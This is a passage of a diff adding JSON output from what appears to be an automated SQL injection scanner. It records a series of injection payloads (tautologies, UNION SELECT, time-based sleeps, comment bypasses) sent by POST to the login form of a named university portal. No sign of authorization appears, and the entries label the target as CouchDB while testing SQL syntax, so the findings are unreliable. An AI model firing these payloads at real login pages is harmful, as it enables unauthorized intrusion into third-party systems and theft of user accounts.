+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "\"))",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "'/**/OR/**/'1'='1",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' OR pg_sleep(5)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' OR '1'='1' AND 1=(SELECT 1 FROM non_existent_table)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "admin' --",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "\" OR \"1\"=\"1",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' OR SLEEP(5) AND '1'='1--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' OR '1'='1'/*",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' UNION SELECT 1, 'admin', 'password'--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' AND 1=CONVERT(INT, (SELECT @@version))--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' AND 1=(SELECT 1 FROM non_existent_table)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
             }
         ]
     }
